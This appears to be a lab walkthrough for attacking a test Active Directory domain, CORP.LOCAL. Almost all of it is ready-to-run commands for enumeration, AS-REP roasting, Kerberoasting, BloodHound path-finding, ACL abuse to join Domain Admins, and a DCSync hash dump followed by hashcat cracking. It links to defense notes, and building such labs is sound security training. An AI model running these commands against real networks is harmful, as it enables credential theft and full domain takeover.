# Attack walkthrough — CORP.LOCAL

Run from the Linux host. Replace `10.0.0.10` with DC01's IP. Tools: impacket
(pipx), netexec (`nxc`), hashcat (RTX 4090, companion repo).

## 0. Recon / enumeration

```bash
# who answers, what's the domain, is SMB signing on
nxc smb 10.0.0.10
# null/guest session user list if allowed
nxc smb 10.0.0.10 -u '' -p '' --users
# LDAP enumeration once you have any creds
nxc ldap 10.0.0.10 -u jsmith -p password1 --users --groups
```

## 1. AS-REP roasting (no creds needed for the roastable user)

`jsmith` has Kerberos pre-auth disabled, so the KDC hands out an encrypted
AS-REP to anyone — crackable offline.

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
# crack it (mode 18200) on the 4090
hashcat -m 18200 asrep.hash ../gpu-hash-cracking/wordlists/rockyou.txt -r best64.rule
```

## 2. Kerberoasting (needs any valid domain creds)

Service accounts with SPNs: request their TGS, crack offline. No special privs.

```bash
GetUserSPNs.py corp.local/jsmith:password1 -dc-ip 10.0.0.10 -request -outputfile kerb.hash
# crack it (mode 13100) — svc_backup/svc_sql have weak passwords
hashcat -m 13100 kerb.hash ../gpu-hash-cracking/wordlists/rockyou.txt -r best64.rule
```

## 3. Map it with BloodHound

```bash
# collect with the python collector (or SharpHound.exe on WS01)
pipx run bloodhound-ce-python -u jsmith -p password1 -d corp.local -ns 10.0.0.10 -c all --zip
# upload the zip at http://localhost:8080, then run:
#   - "Shortest paths to Domain Admins"
#   - mark cracked users as Owned; BloodHound shows the path forward
# rpatel's GenericAll over Domain Admins lights up here.
```

## 4. Escalate via the ACL path

Once you own `rpatel` (cracked in step 2's spray or dumped later), abuse its
`GenericAll` over Domain Admins to add yourself:

```bash
net rpc group addmem "Domain Admins" rpatel -U corp.local/rpatel%Welcome123 -S 10.0.0.10
# or with impacket's dacledit / net.py
```

## 5. Dump all hashes (once you have DA or replication rights)

```bash
secretsdump.py corp.local/Administrator:'P@ssw0rd'@10.0.0.10 -just-dc-ntlm -outputfile domain
# feed domain.ntds into the hash-cracking lab:
hashcat -m 1000 domain.ntds.ntds ../gpu-hash-cracking/wordlists/rockyou.txt -r dive.rule
```

That closes the loop: **enumerate → roast → crack → escalate → DCSync → crack
everything.** Every step has a detection in the [defense notes](../docs/defense.md).
